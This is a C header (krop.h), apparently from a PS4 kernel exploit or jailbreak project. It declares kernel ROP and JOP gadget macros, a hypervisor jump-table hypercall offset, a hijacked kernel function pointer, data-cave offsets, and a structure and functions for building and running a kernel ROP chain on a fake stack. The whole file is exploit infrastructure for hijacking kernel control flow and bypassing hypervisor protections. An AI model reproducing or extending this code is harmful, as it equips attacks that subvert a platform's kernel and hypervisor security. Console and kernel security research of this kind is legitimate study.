#ifndef KROP_H
#define KROP_H

#include <pthread.h>
#include <sys/types.h>

#include "kdlsym.h"

#define KROP_GADGET_RET                             kdlgadget(KERNEL_GADGET_RET)
#define KROP_GADGET_INFLOOP                         kdlgadget(KERNEL_GADGET_INFLOOP)
#define KROP_GADGET_HYPERCALL_SET_CPUID_PS4         kdlgadget(KERNEL_GADGET_HYPERCALL_SET_CPUID_PS4)
#define KROP_GADGET_RETURN_ADDR                     kdlgadget(KERNEL_GADGET_RETURN_ADDR)
#define KROP_GADGET_POP_RDI                         kdlgadget(KERNEL_GADGET_POP_RDI)
#define KROP_GADGET_POP_RSI                         kdlgadget(KERNEL_GADGET_POP_RSI)
#define KROP_GADGET_POP_RDX                         kdlgadget(KERNEL_GADGET_POP_RDX)
#define KROP_GADGET_POP_RAX                         kdlgadget(KERNEL_GADGET_POP_RAX)
#define KROP_GADGET_POP_RBX                         kdlgadget(KERNEL_GADGET_POP_RBX)
#define KROP_GADGET_ADD_RAX_RDX                     kdlgadget(KERNEL_GADGET_ADD_RAX_RDX)
#define KROP_GADGET_MOV_R9_QWORD_PTR_RDI_48h        kdlgadget(KERNEL_GADGET_MOV_R9_QWORD_PTR_RDI_48)
#define KROP_GADGET_POP_R12                         kdlgadget(KERNEL_GADGET_POP_R12)
#define KROP_GADGET_ADD_RAX_RDX                     kdlgadget(KERNEL_GADGET_ADD_RAX_RDX)
#define KROP_GADGET_MOV_QWORD_PTR_RDI_RSI           kdlgadget(KERNEL_GADGET_MOV_QWORD_PTR_RDI_RSI)
#define KROP_GADGET_POP_RSP                         kdlgadget(KERNEL_GADGET_POP_RSP)
#define KROP_GADGET_MOV_RAX_QWORD_PTR_RAX           kdlgadget(KERNEL_GADGET_MOV_RAX_QWORD_PTR_RAX)
#define KROP_GADGET_MOV_QWORD_PTR_RAX_0             kdlgadget(KERNEL_GADGET_MOV_QWORD_PTR_RAX_0)
#define KROP_GADGET_SETJMP                          kdlgadget(KERNEL_GADGET_SETJMP)
#define KROP_GADGET_LONGJMP                         kdlgadget(KERNEL_GADGET_LONGJMP)
#define KROP_GADGET_JOP1                            kdlgadget(KERNEL_GADGET_JOP1)
#define KROP_GADGET_JOP2                            kdlgadget(KERNEL_GADGET_JOP2)

#define KROP_HV_JMP_TABLE                           kdlsym(KERNEL_SYM_HV_JMP_TABLE)
#define KROP_HV_JMP_TABLE_HYPERCALL_ENT             KROP_HV_JMP_TABLE + 0x70
#define KROP_DATA_CAVE                              kdlsym(KERNEL_SYM_DATA_CAVE)
#define KROP_FUNC_PTR                               kdlsym(KERNEL_SYM_HIJACKED_FUNC_PTR)
#define KROP_JOP1_OFFSET_FROM_JMP_TABLE             KROP_GADGET_JOP1 - KROP_HV_JMP_TABLE
#define KROP_JOP2_OFFSET_FROM_JMP_TABLE             KROP_GADGET_JOP2 - KROP_HV_JMP_TABLE

#define KROP_DATA_CAVE_SAVECTX                      KROP_DATA_CAVE + 0x4
#define KROP_DATA_CAVE_ROPCTX                       KROP_DATA_CAVE + 0x44
#define KROP_DATA_CAVE_RSI_PTR                      KROP_DATA_CAVE + 0x84
#define KROP_DATA_CAVE_ROP_CHAIN                    KROP_DATA_CAVE + 0x8C

struct krop_manage
{
    int core;
    int done;
    int pipe_fds[2];
    pthread_t thread;
    uint64_t thread_kstack;
    uint64_t tag1;
    uint64_t tag2;
    uint64_t kstack_orig_ret_addr;
    uint64_t kstack_orig_arg;
    uint64_t kstack_ret_addr_offset;
    uint64_t kstack_fake_stack_offset;
    char fake_stack[0x1000];
    char *fake_stack_cur;
};

struct krop_manage *create_krop_chain();
void krop_push(struct krop_manage *krop, uint64_t val);
void krop_push_write8(struct krop_manage *krop, uint64_t dest, uint64_t val);
void krop_push_exit(struct krop_manage *krop);
void krop_push_infloop(struct krop_manage *krop);
void krop_copy_kernel(struct krop_manage *krop);
void krop_run(struct krop_manage *krop);
void krop_dump_fake_stack(struct krop_manage *krop, int in_kernel);
void krop_dump_real_stack(struct krop_manage *krop);

#endif // KROP_H